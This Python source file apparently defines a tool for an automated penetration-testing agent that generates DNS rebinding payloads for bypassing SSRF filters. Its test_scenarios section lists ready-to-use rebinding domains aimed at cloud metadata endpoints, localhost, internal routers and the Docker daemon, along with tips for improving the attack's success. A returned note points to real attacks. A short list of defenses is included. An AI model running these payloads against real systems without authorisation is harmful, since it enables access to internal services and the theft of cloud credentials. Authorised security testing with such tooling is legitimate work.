"""DNS Rebinding Server for testing SSRF and localhost bypass."""

from __future__ import annotations

from typing import Any, Literal

from strix.tools.registry import register_tool


DNSRebindingAction = Literal["generate_domain", "info", "test_scenarios"]


@register_tool
def dns_rebinding_server(
    action: DNSRebindingAction,
    target_ip: str | None = None,
    attacker_ip: str | None = None,
    ttl: int = 0,
) -> dict[str, Any]:
    """DNS Rebinding Server for SSRF and localhost bypass attacks.

    Generates DNS rebinding payloads and provides information about
    DNS rebinding techniques for testing SSRF filters.

    Args:
        action: The DNS rebinding action:
            - generate_domain: Generate rebinding domain configuration
            - info: Get information about DNS rebinding
            - test_scenarios: List common test scenarios
        target_ip: Target IP address (usually internal like 127.0.0.1)
        attacker_ip: Attacker-controlled IP address
        ttl: DNS TTL in seconds (0 for immediate rebind)

    Returns:
        DNS rebinding configuration and test scenarios
    """
    try:
        if action == "generate_domain":
            target = target_ip or "127.0.0.1"
            attacker = attacker_ip or "1.2.3.4"

            # Convert IPs to hex/decimal for different services
            def ip_to_decimal(ip: str) -> int:
                parts = ip.split(".")
                return (
                    int(parts[0]) * 256**3
                    + int(parts[1]) * 256**2
                    + int(parts[2]) * 256
                    + int(parts[3])
                )

            def ip_to_hex(ip: str) -> str:
                parts = ip.split(".")
                return "".join(f"{int(p):02x}" for p in parts)

            target_decimal = ip_to_decimal(target)
            target_hex = ip_to_hex(target)

            return {
                "target_ip": target,
                "attacker_ip": attacker,
                "ttl": ttl,
                "domains": {
                    "hex_format": f"{target_hex}.1u.ms",
                    "decimal_format": f"{target_decimal}.1u.ms",
                    "custom": f"rebind-{target.replace('.', '-')}.example.com",
                },
                "services": {
                    "1u.ms": "Converts hex/decimal to IP automatically",
                    "nip.io": "Maps domain to IP (e.g., 127-0-0-1.nip.io)",
                    "sslip.io": "Similar to nip.io",
                    "xip.io": "Maps subdomain to IP",
                },
                "configuration": {
                    "first_query": attacker,
                    "subsequent_queries": target,
                    "ttl_seconds": ttl,
                    "description": "First query returns attacker IP (passes whitelist), "
                    "subsequent queries return target IP (bypasses filters)",
                },
                "note": "This is a configuration guide. Deploy actual DNS server for real attacks.",
            }

        if action == "info":
            return {
                "technique": "DNS Rebinding",
                "description": "DNS rebinding exploits the time gap between DNS checks and actual requests",
                "how_it_works": [
                    "1. Application checks if domain is allowed (DNS resolves to safe IP)",
                    "2. DNS record has very low TTL (0-1 seconds)",
                    "3. Application makes actual request (DNS now resolves to internal IP)",
                    "4. Request reaches internal resource, bypassing SSRF filters",
                ],
                "use_cases": [
                    "Bypass SSRF filters that check DNS before making requests",
                    "Access localhost and internal networks",
                    "Bypass IP-based whitelists",
                    "Attack applications with TOCTOU vulnerabilities",
                ],
                "defenses": [
                    "Pin DNS responses (cache for entire request lifecycle)",
                    "Resolve DNS after all application-level checks",
                    "Block private IP ranges at network level",
                    "Use allowlists of specific IPs, not domain names",
                    "Implement minimum TTL enforcement",
                ],
            }

        if action == "test_scenarios":
            return {
                "scenarios": [
                    {
                        "name": "Cloud Metadata Access",
                        "target": "169.254.169.254",
                        "description": "Access AWS/GCP/Azure metadata via rebinding",
                        "payload": "169254169254.1u.ms or a9fea9fe.1u.ms",
                    },
                    {
                        "name": "Localhost Bypass",
                        "target": "127.0.0.1",
                        "description": "Access localhost services",
                        "payload": "127000001.1u.ms or 7f000001.1u.ms",
                    },
                    {
                        "name": "Internal Network Access",
                        "target": "192.168.1.1",
                        "description": "Access internal router/services",
                        "payload": "192168001001.1u.ms or c0a80101.1u.ms",
                    },
                    {
                        "name": "Docker Daemon",
                        "target": "172.17.0.1",
                        "description": "Access Docker daemon on default bridge network",
                        "payload": "172017000001.1u.ms",
                    },
                ],
                "testing_tips": [
                    "Use multiple parallel requests to increase success rate",
                    "Test with different DNS resolvers",
                    "Monitor timing - rebinding needs narrow time window",
                    "Try IPv6 formats (::1 for localhost)",
                    "Combine with other SSRF techniques",
                ],
            }

        return {"error": f"Unknown action: {action}"}

    except (ValueError, KeyError) as e:
        return {"error": f"DNS rebinding operation failed: {e!s}"}
